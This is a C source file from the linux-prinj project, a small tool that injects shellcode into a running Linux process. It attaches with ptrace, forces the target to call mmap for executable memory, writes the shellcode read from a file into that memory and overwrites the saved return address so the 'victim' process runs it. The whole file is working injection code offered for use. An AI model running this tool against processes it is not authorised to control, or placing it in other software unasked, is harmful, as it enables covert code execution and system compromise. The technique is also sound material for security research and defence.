/*
 * This file is part of the linux-prinj project.
 * https://gitlab.com/pgregoire/linux-prinj/
 *
 * Copyright 2022 Philippe Grégoire <git@pgregoire.xyz>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


/*
 * Reads a file into @buf, settings its length in @len.
 */
static int rdfile(const char* path, unsigned char** buf, size_t* len)
{
	int e;
	int fd;
	void* t;
	struct stat st;


	if (0 > stat(path, &st)) {
		return -1;
	}

	if (0 > (fd = open(path, O_RDONLY))) {
		return -1;
	}

	if (0 != (t = malloc(st.st_size))) {
		if (st.st_size == read(fd, t, st.st_size)) {
			close(fd);
			*buf = t;
			*len = st.st_size;
			return 0;
		}
	}

	e = errno;
	free(t);
	close(fd);
	errno = e;

	return -1;
}

/*
 * Writes the @len bytes in @buf at @addr in @pid's address space.
 */
static int
wr2mem(pid_t pid, unsigned long addr, const unsigned char* buf, size_t len)
{
	size_t i;
	unsigned long v;

	for (i = 0 ; i < len ; /**/) {
		v = ((unsigned long*)buf)[i/sizeof(unsigned long)];
		printf("Writing %016llx at 0x%016llx\n", v, addr);
		if (0 != ptrace(PTRACE_POKETEXT, pid, addr, v)) {
			return -1;
		}

		i += sizeof(unsigned long);
		addr += sizeof(unsigned long);
	}

	return 0;
}

int main(int argc, const char* const* argv)
{
	pid_t pid;
	size_t len;
	unsigned char* buf;
	unsigned long bakopc;
	struct user_regs_struct regs1;
	struct user_regs_struct regs2;


	if (3 != argc) {
		fprintf(stderr, "usage: inject <shellcode.file> <victim-pid>\n");
		return 1;
	}

	if (0 != rdfile(argv[1], &buf, &len)) {
		perror("Failed to read shellcode file");
		return 1;
	}

	pid = atoi(argv[2]);

	if (0 != ptrace(PTRACE_ATTACH, pid, 0, 0)) {
		perror("Failed to attach to target process");
		return 1;
	}

	/* Wait for the process to be stopped (under our control). */
	if (pid != waitpid(pid, 0, 0)) {
		perror("Failed waiting for target process");
		return 1;
	}

	/* Get the target process's current registers. */
	if (0 != ptrace(PTRACE_GETREGS, pid, 0, &regs1)) {
		perror("Failed to read registers (1)");
		return 1;
	}
	memcpy(&regs2, &regs1, sizeof(regs1));


	/*
	 * Prepare a call to mmap.
	 * Note that ptrace does not need for PROT_WRITE
	 */
	regs2.rax = 9;		/* sys_mmap */
	regs2.rdi = 0;
	regs2.rsi = len;
	regs2.rdx = 5;		/* PROT_READ | PROT_EXEC */
	regs2.r10 = 0x22;	/* MAP_PRIVATE | MAP_ANONYMOUS */
	regs2.r8 = -1;
	regs2.r9 = 0;
	if (0 != ptrace(PTRACE_SETREGS, pid, 0, &regs2)) {
		perror("Failed to update registers (1)");
		return 1;
	}

	/*
	 * We'll be replacing the next instruction. Backup the
	 * current opcodes.
	 */
	bakopc = ptrace(PTRACE_PEEKTEXT, pid, regs1.rip, 0);
	if (0 != errno) {
		perror("Failed to read opcodes");
		return 1;
	}

	/* Write syscall's opcode as the next instruction to execute. */
	if (0 != ptrace(PTRACE_POKETEXT, pid, regs1.rip, 0x050f)) {
		perror("Failed to write syscall's opcode to memory");
		return 1;
	}

	/* Invoke mmap. */
	if (0 != ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) {
		perror("Failed to singlestep");
		return 1;
	}

	/* Wait for the process to be stopped (under our control). */
	if (pid != waitpid(pid, 0, 0)) {
		perror("Failed waiting for target process");
		return 1;
	}

	/* Get the allocated memory address. */
	if (0 != ptrace(PTRACE_GETREGS, pid, 0, &regs2)) {
		perror("Failed to read registers (2)");
		return 1;
	}

	/* Restore the overwritten opcodes. */
	if (0 != ptrace(PTRACE_POKETEXT, pid, regs1.rip, bakopc)) {
		perror("Failed to restore opcodes");
		return 1;
	}

	/* Restore the registers. */
	if (0 != ptrace(PTRACE_SETREGS, pid, 0, &regs1)) {
		perror("Failed to restore registers");
		return 1;
	}

	bakopc = ptrace(PTRACE_PEEKTEXT, pid, regs1.rsp, 0);
	if (0 != errno) {
		perror("Failed to read stack");
		return 1;
	}

	/* Write the original rsp at the beginning of the mem block */
	if (0 != ptrace(PTRACE_POKETEXT, pid, regs2.rax, bakopc)) {
		perror("Failed to write return rip to memory");
		return 1;
	}

	/* Write shellcode (skipping backed up rip). */
	if (0 != wr2mem(pid, regs2.rax+8, buf, len)) {
		perror("Failed to write shellcode to memory");
		return 1;
	}

	/* Redirect execution flow. */
	if (0 != ptrace(PTRACE_POKETEXT, pid, regs1.rsp, regs2.rax+8)) {
		perror("Failed to redirect execution");
		return 1;
	}

	/* Let the target process execute normally. */
	if (0 != ptrace(PTRACE_DETACH, pid, 0, 0)) {
		perror("Failed to detach process");
		return 1;
	}

	return 0;
}
